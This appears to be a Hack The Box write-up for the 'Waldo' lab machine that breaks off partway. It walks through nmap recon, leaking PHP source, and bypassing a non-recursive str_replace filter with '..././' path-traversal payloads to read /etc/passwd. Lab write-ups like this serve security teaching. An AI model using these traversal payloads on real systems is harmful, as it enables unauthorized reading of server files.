<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    
    
    <meta property="article:tag" content="hackthebox" />
    
    <meta property="article:tag" content="htb" />
    
    <meta property="article:tag" content="boot2root" />
    
    <meta property="article:tag" content="writeup" />
    
    <meta property="article:tag" content="linux" />
    
    <meta property="article:tag" content="php" />
    
    <meta property="article:tag" content="str_replace" />
    
    <meta property="article:tag" content="ssh" />
    
    <meta property="article:tag" content="private key" />
    
    <meta property="article:tag" content="private key authentication" />
    
    <meta property="article:tag" content="identity file" />
    
    <meta property="article:tag" content="linux capabilities" />
    
    <meta property="article:tag" content="capabilities" />
    
    <meta property="article:tag" content="sbin" />
    
    <meta property="article:tag" content="getcap" />
    
    <meta property="article:tag" content="waldo" />
        

    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="HTB Waldo">
    <meta name="twitter:description" content="10.10.10.87 | 30 pts">
    <meta name="twitter:site" content="@jebidiah-anthony" />
    <meta name="twitter:creator" content="@feeeellliix">

    
    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/14_waldo/waldo.jpg" />
    

    
    <meta property="og:title" content="HTB Waldo" />
    

    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>HTB Waldo | jebidiah-anthony</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="HTB Waldo" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="10.10.10.87 30 pts" />
<meta property="og:description" content="10.10.10.87 30 pts" />
<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html" />
<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/14_Waldo.html" />
<meta property="og:site_name" content="jebidiah-anthony" />
<script type="application/ld+json">
{"description":"10.10.10.87 30 pts","@type":"WebPage","headline":"HTB Waldo","url":"https://jebidiah-anthony.github.io/boxes/14_Waldo.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    <style>
      .user_host { color: green; }
      .sys_dir { color: #779ECB; }
      p { color:#aaa; }
      header { margin-bottom: 0px; }
      .header .navbtn {
	position: fixed;
	width: 0px;
	visibility: hidden;
      }
      .header .title { 
	padding-left: 69px;
	vertical-align: middle;
      }
      .header .title h2 { margin: 0; } 

      .container {
	max-width: 1200px;
      }
      .sidebar {
        border-right: 1px dashed #b5e853;
	bottom: 0;
        height: 100%;
	overflow: auto;
	padding: 10px 10px 10px 10px;
        position: fixed;
	top: 0;
        width: 230px;
      }
      .openbtn { 
	color:#b5e853;
	font-size:30px;
	cursor:pointer
      }
      .closebtn {
	color:#b5e853;
	font-size:69px;
	cursor:pointer;
	position:absolute;
	top:0;
	right:25px;
	font-size:36px;
	margin-left:50px;
	visibility:hidden;
      }
      
      .ctf_content {
        margin-left: 250px;
	padding-bottom: 5px;
      }
      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
      .ctf_content h3 { margin: 20px 0px 0px 10px; }
      .ctf_content img {
 	display: block;
	margin-left: auto;
	margin-right: auto;
	max-width: 100%;
	padding: 0 10px 0 0;
      }
      .ctf_content table { padding: 0 15px; }

      #main_content h1 { padding: 20px 0px 0px 8px; }
      #main_content h2, p, pre { 
	padding-right:10px;
	padding-left:15px; 
      }
      #main_content h4 { 
        margin: 20px 0px 10px 0px; 
        padding-left: 25px; 
      }
      #main_content ol, ul { margin: 0 0 0 10px; }

      .highlighter-rouge { padding: 0 10px 0 10px; }

      .section-divider{
        border-bottom: 1.5px solid #b5e853;
        padding-top:28px;
        width:55%;
      }
      
      @media screen and (min-width: 801px) {
	.ctf_content {
          margin-left: 250px;
	  padding-bottom: 5px;
        }
      }
      @media screen and (max-width: 800px) {
        header {
	  background-color: #202020;
	  height: 80px;
	  padding: 0px 0 0 0;
	  position: fixed;
	  top: 0;
	}
        .header .navbtn {
          height: 80px;
	  padding: 18px 0 0 20px;
          visibility: visible;
	  width: 100px;
        }
	.header .title { padding-left: 100px; }
	.header .title h1 { padding-top: 5px; }
        .header .title h2 { margin: 0; }

	.container {
	  width:100%;
	}
	.sidebar {
          width: 0;
          z-index: 1;
          overflow-x: hidden;
	  padding: 0;
          transition: 0.5s;
	}
	.sidebar h2 { 
	  font-size: 18px; 
	  padding: 10px 10px 5px 10px;
	}
	.sidebar div { 
	  font-size: 15px; 
	  padding: 5px 10px 5px 10px;
	}
	.closebtn { visibility:visible; }

	.highlighter-rouge { padding: 0 0 0 0; }

	.ctf_content {
	  margin: 0;
	}
	.ctf_content h2 { padding: 15px 0px 0px 5px; }
        .ctf_content h3 { margin: 15px 10px 0px 15px; }
        .ctf_content img {
	  max-width: 100%;
	  padding: 0 10px 0 0;
        }
	.ctf_content table { 
	  margin: 0 10px 0px -8px;
	  min-width: 800px;
	}

        #main_content { margin-top:80px; }
	#main_content code { font-size: 15px; }
	#main_content h1 { font-size: 25px; }
	#main_content h2 { font-size: 22px; }
	#main_content h3 { font-size: 18px; }
	#main_content h4 { padding-left: 20px; }
	#main_content ol, ul {
	  font-size: 14px;
	  margin: 0 0 0 12px;
	  padding: 0 0 0 25px;
	}
	#main_content table { font-size: 14px; }
      }

      @media screen and (max-width: 480px) {
        header {
	  background-color: #202020;
	  height: 70px;
	  padding: 0px 0 0 0;
	  position: fixed;
	  top: 0;
	}
        .header .navbtn {
          height: 70px;
	  padding: 14px 0 0 18px;
        }
	.header .title { padding-left: 100px; }
	.header .title h1 { font-size:22px; }
        .header .title h2 { font-size:16px; }

	#main_content code { font-size: 13px; }
        #main_content ol, ul {
	  font-size: 13px;
	  margin: 0 0 0 12px;
	  padding: 0 0 0 25px;
	}
	#main_content table { font-size: 13px; }
      }
    </style>

  </head>

  <body>
    <div class="container">
       <div id="sidebar" class="sidebar">
         <span class="closebtn" onclick="closeNav()">&times;</span>      
	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>

<div style="padding-top:10px">
  
  > <a href="/">whoami</a>
  
</div>
<div style="padding-top:10px">  
  >  <a href="/htb.html">
    
    <strong style="color:orange">htb writeups</strong>
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/ctf.html">
    
    ctf writeups
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/projects.html">
    
    projects
    
  </a>
</div>
</div>
	 <div style="padding-bottom:20px">
           
             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>


<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/62_Travel.html">Travel</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/61_Quick.html">Quick</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html">Unbalanced</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html">Flujab</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html">Mischief</a>
  
</div>

<div style="padding-top:10px">
  
  > <strong style="color:orange">Waldo</strong>
  
</div>



	   
	 </div>
       </div>
       <div id="content" class="ctf_content">
	 <header>
           <div class="header">
             <div class="navbtn">
               <span class="openbtn" onclick="openNav()">&#9776;</span>
	     </div>
	     <div class="title">
               <h1>jebidiah-anthony</h1>
               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
	     </div>
           </div>
         </header>
         <section id="main_content"><div class="paragraph">
<p><h1 style="color:red"> HTB Waldo (10.10.10.87) </h1></p>
</div>
<hr>
<hr>
<div class="sect1">
<h2 id="part-1-initial-recon">PART 1 : INITIAL RECON</h2>
<div class="sectionbody">
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>nmap <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.87

  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

<span class="nv">$ </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.87

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
  | ssh-hostkey:
  |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e <span class="o">(</span>RSA<span class="o">)</span>
  |   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 <span class="o">(</span>ECDSA<span class="o">)</span>
  |_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd <span class="o">(</span>ED25519<span class="o">)</span>
  80/tcp open  http    nginx 1.12.2
  | http-methods:
  |_  Supported Methods: GET HEAD POST
  |_http-server-header: nginx/1.12.2
  | http-title: List Manager
  |_Requested resource was /list.html
  |_http-trane-info: Problem with XML parsing of /evox/about</code></pre>
</div>
</div>
</blockquote>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-2-port-enumeration">PART 2 : PORT ENUMERATION</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Opening <span style="color:orange"><strong><code>http&#58;//10.10.10.87</code></strong></span> brings you to a <span style="color:orange">List Manager</span> page:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/14_waldo/80_landing_page.png" alt="Landing Page">
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>It exhibits the following behavior when performing the following actions:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title">Opening the <span style="color:orange">List Manager</span> makes a POST request to <span style="color:orange"><strong><code>dirRead.php</code></strong></span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/dirRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.87</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.10.87/list.html</span>
<span class="na">Content-type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">13</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>

path=./.list/</code></pre>
</div>
</div>
<div class="listingblock">
<div class="title">Opening a list makes a POST request to <span style="color:orange"><strong><code>fileRead.php</code></strong></span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/fileRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.87</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.10.87/list.html</span>
<span class="na">Content-type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">18</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>

file=./.list/list1</code></pre>
</div>
</div>
</blockquote>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-3-exploitation">PART 3 : EXPLOITATION</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Attempting to read the contents of <span style="color:orange"><strong><code>dirRead.php</code></strong></span> and <span style="color:orange"><strong><code>fileRead.php</code></strong></span> by using POST requests:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<div class="title"><span style="color:orange"><strong><code>dirRead.php</code></strong></span>:</div>
<p>HTTP Request:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/fileRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s">...omitted...</span>

file=./dirRead.php</code></pre>
</div>
</div>
<div class="paragraph">
<p>HTTP Response:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="json"><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"&lt;?php</span><span class="se">\n\n</span><span class="s2">if($_SERVER['REQUEST_METHOD'] === </span><span class="se">\"</span><span class="s2">POST</span><span class="se">\"</span><span class="s2">){</span><span class="se">\n\t</span><span class="s2">if(isset($_POST['path'])){</span><span class="se">\n\t\t</span><span class="s2">header('Content-type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t\t</span><span class="s2">$_POST['path'] = str_replace( array(</span><span class="se">\"</span><span class="s2">..</span><span class="se">\/\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">..</span><span class="se">\\\"\"</span><span class="s2">), </span><span class="se">\"\"</span><span class="s2">, $_POST['path']);</span><span class="se">\n\t\t</span><span class="s2">echo json_encode(scandir(</span><span class="se">\"\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">www</span><span class="se">\/</span><span class="s2">html</span><span class="se">\/\"</span><span class="s2"> . $_POST['path']));</span><span class="se">\n\t</span><span class="s2">}else{</span><span class="se">\n\t\t</span><span class="s2">header('Content-type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t\t</span><span class="s2">echo '[false]';</span><span class="se">\n\t</span><span class="s2">}</span><span class="se">\n</span><span class="s2">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<div class="title"><span style="color:orange"><strong><code>fileRead.php</code></strong></span>:</div>
<p>HTTP Request:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/fileRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s">...omitted...</span>

file=./fileRead.php</code></pre>
</div>
</div>
<div class="paragraph">
<p>HTTP Response:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="json"><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"&lt;?php</span><span class="se">\n\n\n</span><span class="s2">if($_SERVER['REQUEST_METHOD'] === </span><span class="se">\"</span><span class="s2">POST</span><span class="se">\"</span><span class="s2">){</span><span class="se">\n\t</span><span class="s2">$fileContent['file'] = false;</span><span class="se">\n\t</span><span class="s2">header('Content-Type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t</span><span class="s2">if(isset($_POST['file'])){</span><span class="se">\n\t\t</span><span class="s2">header('Content-Type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t\t</span><span class="s2">$_POST['file'] = str_replace( array(</span><span class="se">\"</span><span class="s2">..</span><span class="se">\/\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">..</span><span class="se">\\\"\"</span><span class="s2">), </span><span class="se">\"\"</span><span class="s2">, $_POST['file']);</span><span class="se">\n\t\t</span><span class="s2">if(strpos($_POST['file'], </span><span class="se">\"</span><span class="s2">user.txt</span><span class="se">\"</span><span class="s2">) === false){</span><span class="se">\n\t\t\t</span><span class="s2">$file = fopen(</span><span class="se">\"\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">www</span><span class="se">\/</span><span class="s2">html</span><span class="se">\/\"</span><span class="s2"> . $_POST['file'], </span><span class="se">\"</span><span class="s2">r</span><span class="se">\"</span><span class="s2">);</span><span class="se">\n\t\t\t</span><span class="s2">$fileContent['file'] = fread($file,filesize($_POST['file']));  </span><span class="se">\n\t\t\t</span><span class="s2">fclose();</span><span class="se">\n\t\t</span><span class="s2">}</span><span class="se">\n\t</span><span class="s2">}</span><span class="se">\n\t</span><span class="s2">echo json_encode($fileContent);</span><span class="se">\n</span><span class="s2">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>It exposes the PHP source code for both files:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:orange"><strong><code>dirRead.php</code></strong></span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"POST"</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])){</span>
	    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-type: application/json'</span><span class="p">);</span>
	    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">=</span> <span class="c1"><mark>str_replace( array("../", "..\""), "", $_POST['path']);</mark></span>
        <span class="c1"><mark>echo json_encode(scandir("/var/www/html/" . $_POST['path']));</mark></span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-type: application/json'</span><span class="p">);</span>
	    <span class="k">echo</span> <span class="s1">'[false]'</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:orange"><strong><code>fileRead.php</code></strong></span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="cp">&lt;?php</span>


<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"POST"</span><span class="p">){</span>
    <span class="nv">$fileContent</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/json'</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/json'</span><span class="p">);</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">=</span> <span class="c1"><mark>str_replace( array("../", "..""), "", $_POST['file']);</mark></span>
        <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">],</span> <span class="s2">"user.txt"</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">){</span>
                <span class="nv">$file</span> <span class="o">=</span> <span class="c1"><mark>fopen("/var/www/html/" . $_POST['file'], "r");</mark></span>
                <span class="nv">$fileContent</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]));</span>
                <span class="nb">fclose</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$fileContent</span><span class="p">);</span>
<span class="p">}</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>From this, we could see that the base directory for the <span style="color:orange">List Manager</span> is at <strong><code>/var/www/html</code></strong> and reading files outside the directory is prevented by converting <span style="color:red"><strong><code>../</code></strong></span> or <span style="color:red"><strong><code>.."</code></strong></span> to an empty string. This could be bypassed by instead using <span style="color:red"><strong><code>&#8230;&#8203;/./</code></strong></span> since functions like this and <strong><code>preg_replace()</code></strong> are not recursive.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<div class="title"><span style="color:red">Now, attempting to read files outside <strong><code>/var/www/html</code></strong></span>:</div>
<p>HTTP Request:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/fileRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s">...omitted...</span>

file=..././..././..././etc/passwd</code></pre>
</div>
</div>
<div class="paragraph">
<p>HTTP Response:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="json"><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"root:x:0:0:root:</span><span class="se">\/</span><span class="s2">root:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">ash</span><span class="se">\n</span><span class="s2">bin:x:1:1:bin:</span><span class="se">\/</span><span class="s2">bin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">daemon:x:2:2:daemon:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">adm:x:3:4:adm:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">adm:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">lp:x:4:7:lp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">lpd:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">sync:x:5:0:sync:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sync</span><span class="se">\n</span><span class="s2">shutdown:x:6:0:shutdown:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">shutdown</span><span class="se">\n</span><span class="s2">halt:x:7:0:halt:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">halt</span><span class="se">\n</span><span class="s2">mail:x:8:12:mail:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">mail:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">news:x:9:13:news:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">news:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">uucp:x:10:14:uucp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">uucppublic:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">operator:x:11:0:operator:</span><span class="se">\/</span><span class="s2">root:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sh</span><span class="se">\n</span><span class="s2">man:x:13:15:man:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">man:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">postmaster:x:14:12:postmaster:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">mail:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">cron:x:16:16:cron:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">cron:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">ftp:x:21:21::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">ftp:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">sshd:x:22:22:sshd:</span><span class="se">\/</span><span class="s2">dev</span><span class="se">\/</span><span class="s2">null:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">at:x:25:25:at:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">cron</span><span class="se">\/</span><span class="s2">atjobs:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">squid:x:31:31:Squid:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">cache</span><span class="se">\/</span><span class="s2">squid:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">xfs:x:33:33:X Font Server:</span><span class="se">\/</span><span class="s2">etc</span><span class="se">\/</span><span class="s2">X11</span><span class="se">\/</span><span class="s2">fs:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">games:x:35:35:games:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">games:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">postgres:x:70:70::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">postgresql:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sh</span><span class="se">\n</span><span class="s2">cyrus:x:85:12::</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">cyrus:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">vpopmail:x:89:89::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">vpopmail:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">ntp:x:123:123:NTP:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">empty:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">smmsp:x:209:209:smmsp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">mqueue:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">guest:x:405:100:guest:</span><span class="se">\/</span><span class="s2">dev</span><span class="se">\/</span><span class="s2">null:</span><span class="se">\/</span><span class="s2">sbin</span><span 